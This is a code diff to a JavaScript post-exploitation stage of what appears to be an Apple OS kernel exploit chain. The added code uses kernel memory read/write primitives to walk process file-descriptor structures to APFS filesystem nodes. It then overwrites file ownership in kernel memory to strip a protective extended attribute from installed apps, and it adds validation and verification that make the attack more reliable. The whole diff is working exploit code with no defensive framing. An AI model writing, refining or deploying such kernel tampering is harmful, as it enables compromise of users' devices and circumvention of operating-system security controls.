@@ -8983,35 +8983,138 @@ function start() { LOG("[+] PE start() called");
 			const OFF_VNODE_V_DATA = 0xe0n;
 			const OFF_APFS_FSNODE_UID = 0x84n;
 			const OFF_APFS_FSNODE_GID = 0x88n;
+			const OFF_STAT_UID = 0x10n;
+			const OFF_STAT_GID = 0x14n;
+			const KERNEL_OBJECT_MIN = 0xffffffd000000000n;
+			const KERNEL_OBJECT_MAX = 0xfffffff000000000n;
 
 			let ourPid = ALNative.callSymbol("getpid");
 			let ourTaskAddr = ALTask.getTaskAddrByPID(ourPid);
 			let ourProcAddr = ALTask.getTaskProc(ourTaskAddr);
 			LOG("[THREEAPP] ourProc=0x" + BigInt.asUintN(64, BigInt(ourProcAddr)).toString(16));
+			if (!isKernelObjectPtr(ourProcAddr)) throw "invalid self proc pointer";
 
 			let fdOfilesPtr = ALChain.read64(ourProcAddr + OFF_PROC_P_FD + OFF_FILEDESC_FD_OFILES);
 			fdOfilesPtr = ALChain.strip(fdOfilesPtr);
 			LOG("[THREEAPP] fd_ofiles=0x" + BigInt.asUintN(64, BigInt(fdOfilesPtr)).toString(16));
+			if (!isKernelObjectPtr(fdOfilesPtr)) throw "invalid fd_ofiles pointer";
+
+			function hex64(value) {
+				return "0x" + BigInt.asUintN(64, BigInt(value || 0n)).toString(16);
+			}
+
+			function getErrno() {
+				let ep = ALNative.callSymbol("__error");
+				return ep ? ALNative.read32(BigInt(ep)) : -1;
+			}
+
+			function syncApfs() {
+				ALNative.callSymbol("sync");
+				ALNative.callSymbol("sync");
+				ALNative.callSymbol("sync");
+			}
+
+			function isKernelObjectPtr(value) {
+				if (!value) return false;
+				let ptr = BigInt.asUintN(64, BigInt(value));
+				return ptr >= KERNEL_OBJECT_MIN && ptr < KERNEL_OBJECT_MAX;
+			}
+
+			function checkedKernelPtr(raw, label) {
+				let ptr = raw;
+				if (!isKernelObjectPtr(ptr)) ptr = ALChain.strip(raw);
+				if (!isKernelObjectPtr(ptr)) {
+					LOG("[THREEAPP] " + label + " invalid kernel object ptr raw=" + hex64(raw) + " stripped=" + hex64(ptr));
+					return 0n;
+				}
+				return BigInt.asUintN(64, BigInt(ptr));
+			}
+
+			function statOwner(path) {
+				let statBuf = ALNative.callSymbol("malloc", 256n);
+				if (!statBuf || statBuf === 0n) return null;
+				try {
+					let ret = ALNative.callSymbol("stat", path, statBuf);
+					if (Number(ret) !== 0) {
+						LOG("[THREEAPP] stat failed errno=" + getErrno() + " path=" + path);
+						return null;
+					}
+					let statPtr = BigInt(statBuf);
+					return {
+						uid: ALNative.read32(statPtr + OFF_STAT_UID),
+						gid: ALNative.read32(statPtr + OFF_STAT_GID)
+					};
+				} finally {
+					ALNative.callSymbol("free", statBuf);
+				}
+			}
+
+			function xattrState(path) {
+				let ret = ALNative.callSymbol("getxattr", path, XATTR_NAME, 0n, 0n, 0n, 0n);
+				if (Number(ret) >= 0) return { present: true, size: Number(ret), errno: 0 };
+				let eno = getErrno();
+				if (eno === 93) return { present: false, size: 0, errno: eno };
+				return { present: null, size: -1, errno: eno };
+			}
 
 			function apfsOwnPath(path) {
 				let fd = ALNative.callSymbol("open", path, 0n); // O_RDONLY
-				if (!fd || Number(fd) < 0) return false;
+				if (Number(fd) < 0) {
+					LOG("[THREEAPP] open failed errno=" + getErrno() + " path=" + path);
+					return false;
+				}
 				let fdNum = Number(fd);
+				try {
+					let fileproc = checkedKernelPtr(ALChain.read64(fdOfilesPtr + BigInt(fdNum) * 8n), "fileproc");
+					if (!fileproc) return false;
+					let fpGlob = checkedKernelPtr(ALChain.read64(fileproc + OFF_FILEPROC_FP_GLOB), "fp_glob");
+					if (!fpGlob) return false;
+					let vnode = checkedKernelPtr(ALChain.read64(fpGlob + OFF_FILEGLOB_FG_DATA), "vnode");
+					if (!vnode) return false;
+					let fsNode = checkedKernelPtr(ALChain.read64(vnode + OFF_VNODE_V_DATA), "fsnode");
+					if (!fsNode) return false;
 
-				let fileproc = ALChain.read64(fdOfilesPtr + BigInt(fdNum * 8));
-				let fpGlob = ALChain.read64(ALChain.strip(fileproc) + OFF_FILEPROC_FP_GLOB);
-				let vnode = ALChain.read64(ALChain.strip(fpGlob) + OFF_FILEGLOB_FG_DATA);
-				let fsNode = ALChain.read64(ALChain.strip(vnode) + OFF_VNODE_V_DATA);
+					let origUid = ALChain.read32(fsNode + OFF_APFS_FSNODE_UID);
+					let origGid = ALChain.read32(fsNode + OFF_APFS_FSNODE_GID);
+					if (origUid > 65535 || origGid > 65535) {
+						LOG("[THREEAPP] implausible owner uid=" + origUid + " gid=" + origGid + " fsnode=" + hex64(fsNode));
+						return false;
+					}
 
-				ALNative.callSymbol("close", fd);
-				if (!fsNode) return false;
+					ALChain.write32(fsNode + OFF_APFS_FSNODE_UID, 501);
+					ALChain.write32(fsNode + OFF_APFS_FSNODE_GID, 501);
 
-				let origUid = ALChain.read32(fsNode + OFF_APFS_FSNODE_UID);
-				let origGid = ALChain.read32(fsNode + OFF_APFS_FSNODE_GID);
-				ALChain.write32(fsNode + OFF_APFS_FSNODE_UID, 501);
-				ALChain.write32(fsNode + OFF_APFS_FSNODE_GID, 501);
+					let checkUid = ALChain.read32(fsNode + OFF_APFS_FSNODE_UID);
+					let checkGid = ALChain.read32(fsNode + OFF_APFS_FSNODE_GID);
+					if (checkUid !== 501 || checkGid !== 501) {
+						LOG("[THREEAPP] owner write verify failed uid=" + checkUid + " gid=" + checkGid);
+						ALChain.write32(fsNode + OFF_APFS_FSNODE_UID, origUid);
+						ALChain.write32(fsNode + OFF_APFS_FSNODE_GID, origGid);
+						syncApfs();
+						return false;
+					}
 
-				return { fsNode: fsNode, origUid: origUid, origGid: origGid };
+					syncApfs();
+					let st = statOwner(path);
+					if (!st || st.uid !== 501 || st.gid !== 501) {
+						LOG("[THREEAPP] stat owner verify failed uid=" + (st ? st.uid : -1) + " gid=" + (st ? st.gid : -1));
+						ALChain.write32(fsNode + OFF_APFS_FSNODE_UID, origUid);
+						ALChain.write32(fsNode + OFF_APFS_FSNODE_GID, origGid);
+						syncApfs();
+						return false;
+					}
+
+					return { fsNode: fsNode, origUid: origUid, origGid: origGid };
+				} finally {
+					ALNative.callSymbol("close", fd);
+				}
+			}
+
+			function restoreOwner(own) {
+				if (!own) return;
+				ALChain.write32(own.fsNode + OFF_APFS_FSNODE_UID, own.origUid);
+				ALChain.write32(own.fsNode + OFF_APFS_FSNODE_GID, own.origGid);
+				syncApfs();
 			}
 
 			LOG("[THREEAPP] Consuming sandbox tokens...");
@@ -9065,6 +9168,18 @@ function start() { LOG("[+] PE start() called");
 						continue;
 					}
 
+					let before = xattrState(appPath);
+					if (before.present === false) {
+						LOG("[THREEAPP] " + appName + " already bypassed (xattr missing)");
+						cleared++;
+						continue;
+					}
+					if (before.present === true) {
+						LOG("[THREEAPP] " + appName + " xattr present size=" + before.size);
+					} else {
+						LOG("[THREEAPP] " + appName + " getxattr preflight errno=" + before.errno + " (continuing)");
+					}
+
 					let own = apfsOwnPath(appPath);
 					if (!own) {
 						LOG("[THREEAPP] " + appName + " apfsOwn failed");
@@ -9075,11 +9190,17 @@ function start() { LOG("[+] PE start() called");
 					try {
 						let ret = ALNative.callSymbol("removexattr", appPath, XATTR_NAME, 0n);
 						if (Number(ret) === 0) {
-							LOG("[THREEAPP] REMOVED xattr from " + appName);
-							cleared++;
+							syncApfs();
+							let after = xattrState(appPath);
+							if (after.present === false) {
+								LOG("[THREEAPP] REMOVED xattr from " + appName);
+								cleared++;
+							} else {
+								LOG("[THREEAPP] " + appName + " removexattr returned OK but verify=" + JSON.stringify(after));
+								skipped++;
+							}
 						} else {
-							let ep = ALNative.callSymbol("__error");
-							let eno = ep ? ALNative.read32(BigInt(ep)) : -1;
+							let eno = getErrno();
 							if (eno === 93) {
 								LOG("[THREEAPP] " + appName + " no xattr present (OK)");
 								cleared++;
@@ -9089,8 +9210,7 @@ function start() { LOG("[+] PE start() called");
 							}
 						}
 					} finally {
-						ALChain.write32(own.fsNode + OFF_APFS_FSNODE_UID, own.origUid);
-						ALChain.write32(own.fsNode + OFF_APFS_FSNODE_GID, own.origGid);
+						restoreOwner(own);
 					}
 				}
 				ALNative.callSymbol("closedir", appDir);
